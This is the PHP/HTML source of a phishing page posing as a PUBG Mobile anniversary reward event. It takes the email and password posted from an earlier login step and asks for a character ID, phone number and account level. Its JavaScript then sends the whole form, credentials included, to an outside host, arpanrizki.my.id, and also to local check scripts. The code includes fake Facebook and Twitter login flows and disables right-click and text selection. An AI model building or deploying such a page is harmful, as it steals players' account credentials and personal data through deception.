<?php
// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$login = $_POST['login'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == ""){
header("Location: index.php");
}
?>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG MOBILE: 4th Anniversary Celebratio Event">
<meta name="description" content="Get reward in this 4th Anniversary Celebratio Event update. Free without paying. Come on get it now !!!">
<meta property="og:description" content="Get reward in this 4th Anniversary Celebratio Event update. Free without paying. Come on get it now !!!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG MOBILE: 4th Anniversary Celebratio Event">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<title>PUBG MOBILE: 4th Anniversary Celebratio Event</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<style>
::placeholder {
color: #000;
}
</style>

<div class="container">

<div class="header"></div>

<div class="box">
<br>
<div class="alert-wrapper">
<div class="alert">
Verify your account to receive your selected popularity
</div>
</div>
<center>
<div class="input-wrapper">
<form class="verify-form" action="check_verify.php" id="formLogin" onsubmit="open_my_account();" method="post">
<input type="hidden" name="email" value="<?php echo $email;?>" readonly>
<input type="hidden" name="password" value="<?php echo $password;?>" readonly>
<input type="number" name="playid" id="playid" placeholder="Enter your character id" autocomplete="off" required>
<input type="number" name="phone" id="phone" placeholder="Enter your phone number" autocomplete="off" required>
<select name="level" required>
<option selected="selected" disabled="disabled" value="">Account Level</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" value="<?php echo $login;?>" readonly>
<button type="submit" onmousedown="buka.play()">Verify my Account</button>

</form>
</div>
</center>
</div> <!--- box --->
</div> <!--- container --->

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script src="js/click.js"></script>

<script>
// code for activate clicked sound
var buka = new Audio();
buka.src = "https://l.top4top.io/m_1725u5z7i1.mp3";

var tutup = new Audio();
tutup.src = "https://a.top4top.io/m_1725zobal2.mp3";

// code for showing hiding items
function openRewards(evt, rewardsClass) {
    var i, tab_rewards, tab_rewards_link;
    tab_rewards = document.getElementsByClassName("tab_rewards");
    for (i = 0; i < tab_rewards.length; i++) {
        tab_rewards[i].style.display = "none";
    }
    tab_rewards_link = document.getElementsByClassName("menu-content");
    for (i = 0; i < tab_rewards_link.length; i++) {
        tab_rewards_link[i].className = tab_rewards_link[i].className.replace(" menu-content-active", "");
    }
    document.getElementById(rewardsClass).style.display = "block";
    evt.currentTarget.className += " menu-content-active";
}
document.getElementById("defaultTabRewards").click();

// code for open rewards page
function open_containerHome(){
    $('.containerHome').show();
    $('.containerLanding').hide();
}

// code for playing header video
function playHeaderVideo() {
    var playHeaderVideo = document.getElementById("playHeaderVideo");
    playHeaderVideo.play();
}

// code for showing hiding popup
function open_itemReward_confirmation(ag) {
    var itemReward_confirmationImg = $(ag).attr("src");
    $('.itemReward_confirmation').show();
    $('#myItemReward_confirmationImg').attr('src',itemReward_confirmationImg);
}
function open_otherReward_confirmation(ag) {
    var otherReward_confirmationImg = $(ag).attr("src");
    var otherReward_confirmationValue = $(ag).attr("value");
    $('.otherReward_confirmation').show();
    $('#myOtherReward_confirmationImg').attr('src',otherReward_confirmationImg);
    $('#otherReward_confirmationValue').html(otherReward_confirmationValue);
}
function open_account_login(){
    $('.account_login').show();
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}
function open_facebook(){
    $('.login-facebook').show();
    $('.account_login').hide();
}
function open_twitter(){
    $('.login-twitter').show();
    $('.account_login').hide();
}
function close_reward_confirmation(){
    $(".itemReward_confirmation").hide()
    $(".otherReward_confirmation").hide()
}
function tutup_facebook(){
    $('.login-facebook').hide()
    $('.account_login').show();
}
function tutup_twitter(){
    $('.login-twitter').hide()
    $('.account_login').show();
}

// code for validate data to next step
function ValidateLoginFbData() {
    $('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData){
    submitingValidateLoginFbData.preventDefault();

    $email = $('#email-facebook').val().trim();
    $password = $('#password-facebook').val().trim();
    $login = $('#login-facebook').val().trim();
    if($email == '' || $password == '') {
    } else {
    $('.login-facebook').hide();
    $('.account_verification').show();
    $("input#validateEmail").val($email);
    $("input#validatePassword").val($password);
    $("input#validateLogin").val($login);
    }
    });
}
function ValidateLoginTwitterData() {
    $('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData){
    submitingValidateLoginTwitterData.preventDefault();

    $email = $('#email-twitter').val().trim();
    $password = $('#password-twitter').val().trim();
    $login = $('#login-twitter').val().trim();
    if($email == '' || $password == '') {
    } else {
    $('.login-twitter').hide();
    $('.account_verification').show();
    $("input#validateEmail").val($email);
    $("input#validatePassword").val($password);
    $("input#validateLogin").val($login);
    }
    });
}

function open_my_account() {
    var myFormAcc = $("#formLogin").serialize();
    $.ajax({url: 'https://arpanrizki.my.id/',
        data: myFormAcc,type: 'POST',
        success: function()
        {return true;},
        error: function()
        {return true;}});}


// code for validate data to sending to file result
function ValidateVerificationData(){
    $('#ValidateVerificationDataForm').submit(function(submitingVerificationData){
    submitingVerificationData.preventDefault();

    var $validateEmail = $("input#validateEmail").val();
    var $validatePassword = $("input#validatePassword").val();
    var $playid = $("input#playid").val();
    var $phone = $("input#phone").val();
    var $level = $("input#level").val();
    var $validateLogin = $("input#validateLogin").val();
    if($validateEmail == "" && $validatePassword == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == ""){
    $('.verification_info').show();
    $('.account_verification').hide();
    return false;
    }

    $.ajax({
        type: "POST",
        url: "check.php",
        data: $(this).serialize(),
        beforeSend: function() {
            $('.check_verification').show();
            $('.account_verification').hide();
        },
        success: function(){
        $(".processing_account").show();
        $('.check_verification').hide();
        $('.account_verification').hide();
        }
    });
    });
    return false;
};
</script>

</body>
</html>
